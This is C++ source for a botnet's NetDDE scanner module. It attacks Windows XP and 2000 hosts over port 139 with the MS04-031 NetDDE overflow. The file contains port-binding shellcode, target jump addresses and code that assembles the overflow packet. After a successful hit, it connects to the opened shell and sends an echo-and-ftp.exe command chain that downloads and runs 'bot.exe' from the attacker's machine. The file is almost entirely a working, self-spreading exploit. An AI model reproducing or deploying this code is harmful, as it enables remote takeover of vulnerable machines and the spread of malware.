#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
//#ifdef __COMPILE_SCANNER_NETDDE__
#include "utility.h"
#include "shellcode.h"

class CScannerNETDDE : public CScannerBase
{
public:
	CScannerNETDDE();
	virtual ~CScannerNETDDE() throw() { }

	bool Exploit();
private:
	unsigned long ndlen,ntarget;
	char * packet_assembly(char *name, char *host);
	unsigned char *find_smbname(unsigned char *data, unsigned long len);
	char *netbios_encode(char *ndata, char service);
	unsigned long fixx(unsigned char *data, unsigned long i);
	unsigned long chksum(unsigned char *data, unsigned long dlen);
};

/* targets table */  
struct targets {  
	int	num;  
	char	name[50];
	long	jmpaddr;  
}  
target[]= {  
	{ 0, "WinXP [universal] ", 0x00abfb1c - 0x20 },  
	{ 1, "Win2K [universal] ", 0x009efb60 - 0x20 }  
};  

/* portbind shellcode */  
unsigned char portbindsc[] =   
"\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c"  
"\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b"  
"\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78"  
"\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b"  
"\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03"  
"\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b"  
"\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c"  
"\x61\xc3\xeb\x3d\xad\x50\x52\xe8\xa8\xff\xff\xff\x89\x07\x83\xc4"  
"\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xec\x72\xfe\xb3"  
"\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xa4\x1a\x70"  
"\xc7\xa4\xad\x2e\xe9\xe5\x49\x86\x49\xcb\xed\xfc\x3b\xe7\x79\xc6"  
"\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5e"  
"\xe8\x3d\xff\xff\xff\x8b\xd0\x83\xee\x36\x8d\x7d\x04\x8b\xce\x83"  
"\xc1\x10\xe8\x9d\xff\xff\xff\x83\xc1\x18\x33\xc0\x66\xb8\x33\x32"  
"\x50\x68\x77\x73\x32\x5f\x8b\xdc\x51\x52\x53\xff\x55\x04\x5a\x59"  
"\x8b\xd0\xe8\x7d\xff\xff\xff\xb8\x01\x63\x6d\x64\xc1\xf8\x08\x50"  
"\x89\x65\x34\x33\xc0\x66\xb8\x90\x01\x2b\xe0\x54\x83\xc0\x72\x50"  
"\xff\x55\x24\x33\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x14"  
"\x8b\xf0\x33\xc0\x33\xdb\x50\x50\x50\xb8\x02\x01\x11\x5c\xfe\xcc"  
"\x50\x8b\xc4\xb3\x10\x53\x50\x56\xff\x55\x18\x53\x56\xff\x55\x1c"  
"\x53\x8b\xd4\x2b\xe3\x8b\xcc\x52\x51\x56\xff\x55\x20\x8b\xf0\x33"  
"\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa\x5f\xc6\x07\x44"  
"\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab\x5f\x33\xc0\x8d"  
"\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xff\x75\x34\x50"  
"\xff\x55\x08\xf7\xd0\x50\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55"  
"\x28\xff\x55\x0c";

#define SET_PORTBIND_PORT(buf, port)	*(unsigned short *)(((buf)+300)) = (port)  
#define SET_CONNECTBACK_IP(buf, ip)	*(unsigned long  *)(((buf)+283)) = (ip)  
#define SET_CONNECTBACK_PORT(buf, port)	*(unsigned short *)(((buf)+290)) = (port)

char jmpcode[] =  
"\x90\x90\x90\x90\x66\x81\xC7\x20\x03\xFF\xE7\x90\x90\x90\x90\x90"  
"\x50\x6f\x43\x20\x66\x6f\x72\x20\x4e\x65\x74\x44\x44\x45\x20\x28"  
"\x4d\x53\x30\x34\x2d\x30\x33\x31\x29\x2e\x20\x43\x6f\x70\x79\x72"  
"\x69\x67\x68\x74\x20\x28\x63\x29\x20\x32\x30\x30\x34\x2d\x32\x30"  
"\x30\x35\x20\x68\x6f\x75\x73\x65\x6f\x66\x64\x61\x62\x75\x73\x2e"  
"\xBB\xBB\xBB\xBB" /* => eax */  
"PADPAD"; 

char smb_sesreq[] =  
"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"  
"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"  
"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"  
"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"  
"\x41\x43\x41\x43\x41\x41\x41\x00";  
  
char smb_negotiate[] =  
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"  
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"  
"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"  
"\x31\x32\x00";  
  
char d1[] =  
"\x0d\x12\x0b\x06\x0d\x18\x1c\x01\x10\x03\x12\x08\x1d\x1f\x0a\x0a"  
"\x16\x02\x17\x0e\x1b\x0d";  
  
char req1[] =  
"\x81\x00\x00\x44";  
  
char req2[] =  
"CACACACACACACACACACACACACACACABP";  
  
char h1[] =  
"\x45\x44\x44\x4E\x00\x00\x00";  
  
char h2[] =  
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";  
  
char h3[] =  
"\x00\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00";  

CScannerNETDDE::CScannerNETDDE() { m_szType="CScannerNETDDE"; m_sScannerName.Assign("NETDDE"); }

unsigned char *CScannerNETDDE::find_smbname(unsigned char *data, unsigned long len)  
{  
	unsigned char *ptr;  
	unsigned long i = 0;  
  
	ptr = data;  
	ptr += 91;  
  
	while (i <= len - 3) {  
		if (ptr[i] == '\x00')  
		if (ptr[i+1] == '\x00')  
		if (ptr[i+2] == '\x00')  
			return ptr+i+3;  
	i++;  
	}  
  
return NULL;  
} 

char *CScannerNETDDE::netbios_encode(char *ndata, char service)  
{  
	char *tmpdata, *data, *nret;  
	unsigned long dlen;  
	char odiv, omod, o;  
	int i;  
  
	data = (char *)calloc(17, 1);  
	memcpy(data, ndata, strlen(ndata));  
  
	dlen = strlen(data);  
	while (dlen < 15) {  
		strcat(data, "\x20");  
		dlen++;  
	}  
  
	memcpy(data+strlen(data), &service, 1);  
  
	nret = (char *)calloc(strlen(data)*2+1, 1);  
	tmpdata = nret;  
  
	for (i=0; i<16; i++) {  
		o = (char)data[i];  
		odiv = o / 16;  
		odiv = odiv + 0x41;  
		omod = o % 16;  
		omod = omod + 0x41;  
		*tmpdata++ = odiv;  
		*tmpdata++ = omod;  
	}  
  
	free(data);  
  
return nret;  
}

unsigned long CScannerNETDDE::fixx(unsigned char *data, unsigned long i)
{  
	unsigned long len;  
  
	len =	(data[i+3]<<24) +  
		(data[i+2]<<16) +  
		(data[i+1]<<8) +  
		(data[i]);  
  
return len;  
}  

unsigned long CScannerNETDDE::chksum(unsigned char *data, unsigned long dlen)
{  
	unsigned long i, len;  
	unsigned long chk;  
  
	chk = 0xFFFFFFFF;  
	len = dlen - 4;  
  
	for (i=0; i<len; i+=4)  
		chk += fixx(data, i);  
  
	while (i < dlen) {  
		chk += (unsigned char)data[i];  
		i++;  
	}  
  
return chk;  
}  

/* NetDDE packet */  
char * CScannerNETDDE::packet_assembly(char *name, char *host)  
{  
	char *main, *header, *data;  
	char *lname, *rhost;  
	unsigned long llen, rlen, len, hlen, dlen, csum, i;  
	unsigned char name_hi, name_low, rhost_hi, rhost_low;  
	unsigned char hod_hi, hod_low, len_hi, len_low;  
	unsigned char nops[] = "\x90\x90\x90\x90"; /* nops */  
	char hod[] = "HOD-HOD\x01";  
	char hmain[] = "\x01\x00\xBE\x05\x0A\x00\x00";  
	char tmp[8];  
  
  
	llen = strlen(name) + 4;  
	rlen = strlen(host);  
	lname = (char *)calloc(llen + 3, 1);  
	rhost = (char *)calloc(rlen + 3, 1);  
  
	memcpy(lname, name, llen);  
	strcpy(rhost, host);  
	memcpy(lname + llen, "\x01", 1);  
	strcat(rhost, "\x01");  
  
	name_hi   = (unsigned char) ((llen+1) / 256);  
	name_low  = (unsigned char) ((llen+1) % 256);  
	rhost_hi  = (unsigned char) ((rlen + llen + 2) / 256);  
	rhost_low = (unsigned char) ((rlen + llen + 2) % 256);  
  
	len = sizeof(hod) - 1;  
	hod_hi  = (unsigned char) (len / 256);  
	hod_low = (unsigned char) (len % 256);  
  
	main = (char *)calloc(	sizeof(hod)-1 + sizeof(hmain)-1 + llen + rlen + 11, 1 );  
  
	memcpy(main, hmain, sizeof(hmain)-1);  
	sprintf(tmp, "%c%c%c%c%c%c", name_hi, name_low, rhost_hi, rhost_low, hod_hi, hod_low);  
  
	memcpy(main+sizeof(hmain)-1, tmp, 6);  
	memcpy(main+sizeof(hmain)-1+6, "\x00", 1);  
	memcpy(main+sizeof(hmain)-1+7, lname, llen+1);  
	memcpy(main+sizeof(hmain)-1+7+llen+1, rhost, rlen+1);  
	memcpy(main+sizeof(hmain)-1+7+llen+1+rlen+1, hod, sizeof(hod)-1);  
	 
	memcpy(main+sizeof(hmain)-1+7+llen+1+rlen+1+sizeof(hod)-1, "\x2e", 1);  
  
	len = sizeof(hmain)-1+7+llen+1+rlen+1+sizeof(hod)-1+1;  
	len_hi  = (unsigned char) (len / 256);  
	len_low = (unsigned char) (len % 256);  
  
  
	/* header */  
	header = (char *)calloc(sizeof(h1)-1 + sizeof(h2)-1 + sizeof(h3)-1 + 9, 1);  
  
	memcpy(header, h1, sizeof(h1)-1);  
	sprintf(tmp, "%c%c", len_hi, len_low);  
	memcpy(header+sizeof(h1)-1, tmp, 2);  
	memcpy(header+sizeof(h1)-1+2, h2, sizeof(h2)-1);  
	memcpy(header+sizeof(h1)-1+2+sizeof(h2)-1, tmp, 2);  
	memcpy(header+sizeof(h1)-1+2+sizeof(h2)-1+2, h3, sizeof(h3)-1);  
  
	csum = chksum((unsigned char*)main, len);  
	memcpy(header+sizeof(h1)-1+sizeof(h2)-1+4 + sizeof(h3)-1, &csum, 4);  
  
  
	/* data */  
	hlen = sizeof(h1)-1 + sizeof(h2)-1 + sizeof(h3)-1 + 8;  
	data = (char *)calloc(	sizeof(d1)-1 + len+hlen + 37 + 1200, 1 );  
  
	csum = chksum((unsigned char*)header, hlen);  
	memcpy(data+4, &csum, 4);  
	memcpy(data+4+4, header, hlen);  
	memcpy(data+4+4+hlen, main, len);  
	memcpy(data+4+4+hlen+len, d1, sizeof(d1)-1);  
  
	/* nops */  
	for (i=0; i<154; i++)  
		memcpy(data+4+4+hlen+len+sizeof(d1)-1 + i*4, nops, 4);  
  
	/* shellcode */
	/* portbind */  
	SET_PORTBIND_PORT(portbindsc, htons(1981));  
		 
	memcpy(data+4+4+hlen+len+sizeof(d1)-1+154*4, portbindsc, sizeof(portbindsc)-1);  
	dlen = 4+hlen+len+sizeof(d1)-1+sizeof(portbindsc)-1+154*4;
  
	ndlen = dlen + 4;  
	dlen = htonl(dlen);  
	memcpy(data, &dlen, 4);  
  
	free(lname);  
	free(rhost);  
	free(main);  
	free(header);  
  
return data;  
}

bool CScannerNETDDE::Exploit()
{
	int r;
	unsigned long smbname_len;
	unsigned char buf[256];
	unsigned char *name=NULL,*smbname;
	char *data, *hname,*hn2,*ses_req,*req;
	char rbuf[4096];
	unsigned long hname_len,req_sz,hn_len;

	int iHostOS=FpHost(m_sSocket.m_szHost, FP_RPC);
	if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
	if(iHostOS==OS_WINNT) return false;

	switch(iHostOS)
	{
		default: case OS_WINXP: ntarget=0;
			break;
		case OS_WIN2K: ntarget=0;
			break;
	}

	ndlen=0;
	memset(buf, 0, 256);
	if(!m_sSocket.Connect(m_sSocket.m_szHost,139)) return false;

	/* sending session request */  
	if(!m_sSocket.Write(smb_sesreq,sizeof(smb_sesreq)-1)) return false;

	m_sSocket.Recv((char *)buf,256);
	memset(buf, 0, 256);

	/* sending negotiation request */
	if(!m_sSocket.Write(smb_negotiate,sizeof(smb_negotiate)-1)) return false;
	m_sSocket.Recv((char *)buf,256,&r);
  
	smbname = find_smbname(buf, r); 
	if (smbname == NULL) { m_sSocket.Disconnect(); return false; }
	smbname_len = smbname - buf;  
  
	name = (unsigned char *)calloc(smbname_len, 1);

			/* decoding */  
	r = 0;  
	while (smbname_len) {  
		if (*smbname != '\x00') {  
			name[r] = *smbname;  
			r++;  
		}  
		smbname++;  
		smbname_len--;  
	}

	/* Got Smb name starting new Session */
	m_sSocket.Disconnect();

	/* target jmpaddr */  
	memcpy(jmpcode+80, &target[ntarget].jmpaddr, 4);  

	ses_req = (char *)calloc(sizeof(req1)-1 + sizeof(req2)-1 + 114, 1);

	memcpy(ses_req, req1, sizeof(req1)-1);  
	memcpy(ses_req+sizeof(req1)-1, "\x20", 1);  

	hname = netbios_encode((char*)name, 0x1F);
	hname_len = strlen(hname);  

	memcpy(ses_req+sizeof(req1)-1+1, hname, hname_len);  
	memcpy(ses_req+sizeof(req1)-1+1+hname_len, "\x00\x20", 2);  
	memcpy(ses_req+sizeof(req1)-1+1+hname_len+2, req2, sizeof(req2)-1);  

	memcpy(ses_req+sizeof(req1)-1+1+hname_len+2+sizeof(req2)-1, "\x00", 1);  

	req_sz = sizeof(req1)-1+sizeof(req2)-1+hname_len+4;  

	req = req1;

	if(!m_sSocket.Connect(m_sSocket.m_szHost,139)) return false;

	if(!m_sSocket.Write(ses_req,req_sz)) { m_sSocket.Disconnect(); return false; }

	m_sSocket.Recv(rbuf,4096);

	/* check NetDDE */  
	if ((unsigned char)rbuf[0] != 0x82) { m_sSocket.Disconnect(); return false; }

	hn2 = (char *)calloc(16, 1);
	memcpy(hn2, name, strlen((char*)name));
	hn_len = strlen((char*)name);

	while (hn_len < 15) {  
		strcat(hn2, "\x20");  
		hn_len++;  
	}

	/* attacking */
	data = packet_assembly(jmpcode, hn2);

	if(!m_sSocket.Write(data,ndlen)) { m_sSocket.Disconnect(); return false; }
	m_sSocket.Recv(rbuf,4096);

	Sleep(10000); CSocket outSocket; char szRecvBuf[5096];

	if(!outSocket.Connect(m_sSocket.m_szHost, 1981)) // Connect failed, exit
	{	m_sSocket.Disconnect(); return false; }

	SendLocal("%s: Exploited: %s", m_sScannerName.CStr(), m_sSocket.m_szHost);

	char mkdir_buff[400]="";
	int iPort=g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;

	sprintf(mkdir_buff,
		"echo open %s %d > bla.txt&"
		"echo user blah blah >> bla.txt&"
		"echo binary >> bla.txt&"
		"echo get %s >> bla.txt&"
		"echo quit >> bla.txt&"
		"ftp.exe -n -s:bla.txt&"
		"%s\r\n",
		g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), iPort, "bot.exe", "bot.exe");

	if(!outSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	Sleep(500);

	if(!outSocket.Write((char*)mkdir_buff, sizeof(mkdir_buff))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	m_sSocket.Disconnect();

	if(data) free(data);  
	if(hn2) free(hn2);  
	if(ses_req) free(ses_req);  
	if(hname) free(hname);
	if(name) free(name);
	if(smbname) free(smbname);

return false;
}

REGSCANNER(NETDDE, NETDDE, 139, true, true)
//#endif